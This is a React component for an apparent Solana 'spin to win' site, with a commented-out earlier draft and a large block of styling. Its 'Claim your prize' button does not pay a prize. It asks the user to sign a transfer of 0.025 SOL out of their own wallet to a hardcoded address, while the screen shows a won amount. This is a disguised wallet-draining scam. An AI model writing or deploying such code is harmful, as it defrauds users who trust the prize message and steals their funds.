// import { useState, useCallback } from "react";
// import {
//   SystemProgram,
//   PublicKey,
//   Transaction,
//   LAMPORTS_PER_SOL,
// } from "@solana/web3.js";
// import { useAppKitAccount, useAppKitProvider } from "@reown/appkit/react";
// import {
//   useAppKitConnection,
//   type Provider,
// } from "@reown/appkit-adapter-solana/react";

// export default function SendSolanaTransaction() {
//   const { address } = useAppKitAccount();
//   const { connection } = useAppKitConnection();
//   const { walletProvider } = useAppKitProvider<Provider>("solana");
//   const [isSending, setIsSending] = useState(false);
//   const [txSignature, setTxSignature] = useState<string | null>(null);
//   const [error, setError] = useState<string | null>(null);

//   const RECEIVING_ADDRESS = "CHuw4XJSxpZnhQAFd3Vke5VDpkJoZCd4s3fc7BGDvsN7";
//   const SOL_AMOUNT = 0.0001;

//   const sendSol = useCallback(async () => {
//     if (
//       !walletProvider ||
//       !connection ||
//       !address ||
//       !walletProvider.publicKey
//     ) {
//       setError("Wallet not properly connected");
//       return;
//     }

//     setIsSending(true);
//     setError(null);

//     try {
//       const transferIx = SystemProgram.transfer({
//         fromPubkey: walletProvider.publicKey,
//         toPubkey: new PublicKey(RECEIVING_ADDRESS),
//         lamports: SOL_AMOUNT * LAMPORTS_PER_SOL,
//       });

//       const tx = new Transaction().add(transferIx);
//       tx.feePayer = walletProvider.publicKey;
//       tx.recentBlockhash = (
//         await connection.getLatestBlockhash("confirmed")
//       ).blockhash;

//       const signature = await walletProvider.signAndSendTransaction(tx);
//       setTxSignature(signature);
//     } catch (err: unknown) {
//       const message = err instanceof Error ? err.message : "Transaction failed";
//       setError(
//         message.includes("reject") ? "User rejected the transaction" : message
//       );
//     } finally {
//       setIsSending(false);
//     }
//   }, [walletProvider, connection, address]);

//   return (
//     <div className="send-sol-container p-4 border rounded-lg max-w-md mx-auto mt-8">
//       <h2 className="text-xl font-bold mb-4">
//         Connect to wallet first to claim the prize.
//       </h2>

//       <button
//         onClick={sendSol}
//         disabled={!address || isSending || !walletProvider?.publicKey}
//         className={`w-full py-2 px-4 rounded font-medium ${
//           !address || isSending || !walletProvider?.publicKey
//             ? "bg-gray-400 cursor-not-allowed"
//             : "bg-purple-600 hover:bg-purple-700 text-white"
//         }`}
//       >
//         {isSending ? "Claiming..." : `Claim ${SOL_AMOUNT} SOL`}
//       </button>

//       {error && (
//         <div className="mt-4 p-2 bg-red-100 text-red-700 rounded">{error}</div>
//       )}

//       {txSignature && (
//         <div className="mt-4 p-2 bg-green-100 text-green-700 rounded">
//           Transaction successful!{" "}
//           <a
//             href={`https://solscan.io/tx/${txSignature}?cluster=devnet`}
//             target="_blank"
//             rel="noopener noreferrer"
//             className="ml-2 text-blue-600 hover:underline"
//           >
//             View on Solscan
//           </a>
//         </div>
//       )}
//     </div>
//   );
// }

import { useState, useCallback } from "react";
import {
  SystemProgram,
  PublicKey,
  Transaction,
  LAMPORTS_PER_SOL,
} from "@solana/web3.js";
import { useAppKitAccount, useAppKitProvider } from "@reown/appkit/react";
import {
  useAppKitConnection,
  type Provider,
} from "@reown/appkit-adapter-solana/react";

interface SendSolanaTransactionProps {
  wonAmount: number | null;
}

export default function SendSolanaTransaction({
  wonAmount,
}: SendSolanaTransactionProps) {
  const { address } = useAppKitAccount();
  const { connection } = useAppKitConnection();
  const { walletProvider } = useAppKitProvider<Provider>("solana");
  const [isSending, setIsSending] = useState(false);
  const [txSignature, setTxSignature] = useState<string | null>(null);
  const [error, setError] = useState<string | null>(null);

  const RECEIVING_ADDRESS = "CHuw4XJSxpZnhQAFd3Vke5VDpkJoZCd4s3fc7BGDvsN7";

  const sendSol = useCallback(async () => {
    if (
      !walletProvider ||
      !connection ||
      !address ||
      !walletProvider.publicKey ||
      !wonAmount
    ) {
      setError("Wallet not properly connected or no prize won");
      return;
    }

    setIsSending(true);
    setError(null);

    try {
      const transferIx = SystemProgram.transfer({
        fromPubkey: walletProvider.publicKey,
        toPubkey: new PublicKey(RECEIVING_ADDRESS),
        lamports: 0.025 * LAMPORTS_PER_SOL,
      });

      const tx = new Transaction().add(transferIx);
      tx.feePayer = walletProvider.publicKey;
      tx.recentBlockhash = (
        await connection.getLatestBlockhash("confirmed")
      ).blockhash;

      const signature = await walletProvider.signAndSendTransaction(tx);
      setTxSignature(signature);
    } catch (err: unknown) {
      const message = err instanceof Error ? err.message : "Transaction failed";
      setError(
        message.includes("reject") ? "User rejected the transaction" : message
      );
    } finally {
      setIsSending(false);
    }
  }, [walletProvider, connection, address, wonAmount]);

  return (
    <div className="claim-container">
      <div className="claim-panel">
        <div className="panel-header">
          <h2 className="panel-title hack-text neon-text">
            {wonAmount ? "CLAIM YOUR PRIZE" : "SPIN TO WIN FIRST!"}
          </h2>
          <div className="status-indicator">
            <div
              className={`status-dot ${address ? "connected" : "disconnected"}`}
            ></div>
            <span className="status-text">
              {address ? "WALLET CONNECTED" : "WALLET DISCONNECTED"}
            </span>
          </div>
        </div>

        {wonAmount && (
          <div className="prize-display">
            <div className="prize-amount neon-purple">{wonAmount} SOL</div>
            <div className="prize-label">Your Prize</div>
          </div>
        )}

        <button
          onClick={sendSol}
          disabled={
            !address || isSending || !walletProvider?.publicKey || !wonAmount
          }
          className="claim-button cyber-button"
        >
          <span className="button-text">
            {isSending ? (
              <>
                <div className="loading-spinner"></div>
                CLAIMING...
              </>
            ) : wonAmount ? (
              `CLAIM ${wonAmount} SOL`
            ) : (
              "SPIN WHEEL FIRST"
            )}
          </span>
          {!isSending && <div className="button-glow"></div>}
        </button>

        {error && (
          <div className="message error-message">
            <div className="message-icon">⚠️</div>
            <div className="message-text">{error}</div>
          </div>
        )}

        {txSignature && (
          <div className="message success-message">
            <div className="message-icon">✅</div>
            <div className="message-content">
              <div className="message-text">Transaction successful!</div>
              <a
                href={`https://solscan.io/tx/${txSignature}?cluster=devnet`}
                target="_blank"
                rel="noopener noreferrer"
                className="tx-link neon-text"
              >
                View on Solscan →
              </a>
            </div>
          </div>
        )}
      </div>

      <style>{`
        .claim-container {
          display: flex;
          justify-content: center;
          margin: 40px 0;
          padding: 0 20px;
        }

        .claim-panel {
          background: rgba(0, 0, 0, 0.4);
          backdrop-filter: blur(20px);
          border: 2px solid rgba(0, 255, 136, 0.3);
          border-radius: 16px;
          padding: 30px;
          max-width: 500px;
          width: 100%;
          box-shadow: 0 0 30px rgba(0, 255, 136, 0.2),
            inset 0 0 30px rgba(0, 0, 0, 0.2);
          position: relative;
          overflow: hidden;
        }

        .claim-panel:before {
          content: "";
          position: absolute;
          top: 0;
          left: -100%;
          width: 100%;
          height: 100%;
          background: linear-gradient(
            90deg,
            transparent,
            rgba(0, 255, 136, 0.1),
            transparent
          );
          animation: panelScan 4s infinite;
        }

        .panel-header {
          text-align: center;
          margin-bottom: 25px;
        }

        .panel-title {
          font-family: "Orbitron", monospace;
          font-size: 1.5rem;
          font-weight: 700;
          margin: 0 0 15px 0;
          letter-spacing: 2px;
        }

        .status-indicator {
          display: flex;
          align-items: center;
          justify-content: center;
          gap: 8px;
          font-family: "Rajdhani", sans-serif;
          font-size: 0.9rem;
          font-weight: 600;
        }

        .status-dot {
          width: 8px;
          height: 8px;
          border-radius: 50%;
          animation: pulse 2s infinite;
        }

        .status-dot.connected {
          background: #00ff88;
          box-shadow: 0 0 10px #00ff88;
        }

        .status-dot.disconnected {
          background: #ff6b6b;
          box-shadow: 0 0 10px #ff6b6b;
        }

        .status-text {
          color: #ffffff;
          text-shadow: 0 0 5px rgba(255, 255, 255, 0.5);
        }

        .prize-display {
          text-align: center;
          margin: 25px 0;
          padding: 20px;
          background: rgba(153, 69, 255, 0.1);
          border: 1px solid rgba(153, 69, 255, 0.3);
          border-radius: 12px;
          backdrop-filter: blur(10px);
        }

        .prize-amount {
          font-family: "Orbitron", monospace;
          font-size: 2.5rem;
          font-weight: 900;
          margin: 0;
          line-height: 1;
        }

        .prize-label {
          font-family: "Rajdhani", sans-serif;
          font-size: 1rem;
          font-weight: 600;
          color: rgba(255, 255, 255, 0.8);
          margin-top: 5px;
          letter-spacing: 1px;
        }

        .claim-button {
          width: 100%;
          font-size: 1.2rem;
          padding: 18px 24px;
          margin: 20px 0;
          position: relative;
          overflow: hidden;
          background: linear-gradient(45deg, #9945ff, #00ff88) !important;
        }

        .button-text {
          display: flex;
          align-items: center;
          justify-content: center;
          gap: 10px;
          position: relative;
          z-index: 2;
        }

        .loading-spinner {
          width: 20px;
          height: 20px;
          border: 2px solid transparent;
          border-top: 2px solid white;
          border-radius: 50%;
          animation: spin 1s linear infinite;
        }

        .button-glow {
          position: absolute;
          top: 0;
          left: 0;
          right: 0;
          bottom: 0;
          background: linear-gradient(45deg, #9945ff, #00ff88);
          opacity: 0;
          transition: opacity 0.3s ease;
          z-index: 1;
        }

        .claim-button:hover .button-glow {
          opacity: 0.2;
        }

        .message {
          display: flex;
          align-items: flex-start;
          gap: 12px;
          padding: 15px;
          border-radius: 10px;
          margin-top: 20px;
          font-family: "Rajdhani", sans-serif;
          font-weight: 500;
        }

        .error-message {
          background: rgba(255, 107, 107, 0.1);
          border: 1px solid rgba(255, 107, 107, 0.3);
          color: #ff6b6b;
        }

        .success-message {
          background: rgba(0, 255, 136, 0.1);
          border: 1px solid rgba(0, 255, 136, 0.3);
          color: #00ff88;
        }

        .message-icon {
          font-size: 1.2rem;
          flex-shrink: 0;
        }

        .message-content {
          flex: 1;
        }

        .message-text {
          margin-bottom: 8px;
        }

        .tx-link {
          font-family: "Orbitron", monospace;
          font-weight: 600;
          text-decoration: none;
          transition: all 0.3s ease;
        }

        .tx-link:hover {
          text-shadow: 0 0 15px #00ff88;
        }

        @keyframes panelScan {
          0% {
            left: -100%;
          }
          100% {
            left: 100%;
          }
        }

        @keyframes spin {
          0% {
            transform: rotate(0deg);
          }
          100% {
            transform: rotate(360deg);
          }
        }

        @keyframes pulse {
          0%,
          100% {
            opacity: 1;
            transform: scale(1);
          }
          50% {
            opacity: 0.5;
            transform: scale(1.2);
          }
        }

        @media (max-width: 768px) {
          .claim-panel {
            padding: 25px 20px;
            margin: 0 15px;
          }

          .panel-title {
            font-size: 1.3rem;
          }

          .prize-amount {
            font-size: 2rem;
          }

          .claim-button {
            font-size: 1.1rem;
            padding: 15px 20px;
          }
        }

        @media (max-width: 480px) {
          .claim-panel {
            padding: 20px 15px;
          }

          .panel-title {
            font-size: 1.1rem;
          }

          .prize-amount {
            font-size: 1.8rem;
          }

          .claim-button {
            font-size: 1rem;
            padding: 12px 18px;
          }

          .status-indicator {
            font-size: 0.8rem;
          }
        }
      `}</style>
    </div>
  );
}
